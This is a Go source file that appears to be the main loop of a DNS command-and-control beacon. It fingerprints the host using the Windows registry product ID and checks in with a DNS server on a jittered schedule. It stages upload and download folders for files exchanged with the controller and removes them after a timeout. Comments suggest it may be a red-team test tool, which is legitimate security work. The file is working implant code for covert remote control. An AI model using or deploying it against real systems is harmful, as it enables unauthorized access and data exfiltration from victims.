package main

import (
	"os"
	"io"
	"log"
	"time"
	"flag"
	"crypto/md5"
	"math/rand"
	"encoding/hex"

	"../beaconer"
	"golang.org/x/sys/windows/registry"
)

type Config struct {
	ip string
	port int 
	domain string
	offset int
	jitter float64 
	timeout int
	tempfile string
}

var config Config

func main() {
	//Command line switches
	var (
		ip = flag.String("ip", "0.0.0.0", "IP address of DNS Server")
		port = flag.Int("port", 53, "Port of DNS Server")
		domain = flag.String("domain", "proscalar.com", "Domain name to query")

		offset = flag.Int("offset", 60, "Min beacon interval (seconds)")
		jitter = flag.Float64("jitter", 0.0, "Beacon interval jitter fraction between 0 and 1")
		
		timeout = flag.Int("timeout", 2, "Beacon timeout (minutes)")
		tempfile = flag.String("tempfile", "_DnsInit", "Temp file to store command output")
		uid []byte
	)

	flag.Parse()
	config = Config{*ip, *port, *domain, *offset, *jitter, *timeout, *tempfile}

	file, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer file.Close()
    mw := io.MultiWriter(os.Stdout, file)
	log.SetOutput(mw)

	//add seed to randomize when commands are returned by GET requests
   	rand.Seed(time.Now().Unix())

	// create upload and download directory
	createDirectory()

	// generate beacon uid
	hostname, _ := os.Hostname()
	productkey := getProductKey()
	md5 := getMD5Hash(hostname + "_" + productkey)
	for i := 1; i <= 29; i+=8 {
		uid = append(uid, md5[i])
	}  
	log.Printf("Beacon uid is %s", string(uid))

	checkIn := time.Now()
	kill := checkIn.Add(time.Duration(config.timeout) * time.Minute)
	beacon := beacon.NewDnsABeacon(config.ip, config.port, config.domain, string(uid), config.tempfile)

	for {
		if kill.Before(time.Now()) {
			deleteDirectory()
			os.Exit(1)
		}

		beacon.Beacon()
		sleepBeforeCheckIn()		
	}
}

// creates directory to contain files downloaded from c2 and files to upload
func createDirectory() {
	os.Mkdir("upload", 0755)
	os.Mkdir("download", 0755)
}

// deletes directory and contents after test case finishes
func deleteDirectory() {
	os.RemoveAll("upload")
	os.RemoveAll("download")
}

func getMD5Hash(text string) string {
   hash := md5.Sum([]byte(text))
   return hex.EncodeToString(hash[:])
}

// get product key from registry for beacon uid
func getProductKey() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		return ""
	}
	defer k.Close()

	s, _, err := k.GetStringValue("ProductId")
	if err != nil {
		return ""
	}
	return s
}

// sleep for beacon interval varied by jitter percentage
func sleepBeforeCheckIn() {
	jitter := time.Duration(0)

	if config.jitter != 0.0 {
		jitter = ( time.Duration(config.offset) + time.Duration(float64(config.offset)*config.jitter*(2*rand.Float64()-1)) ) * time.Second
	} else {
		jitter = time.Duration(config.offset) * time.Second
	}
	
	time.Sleep(jitter)
}

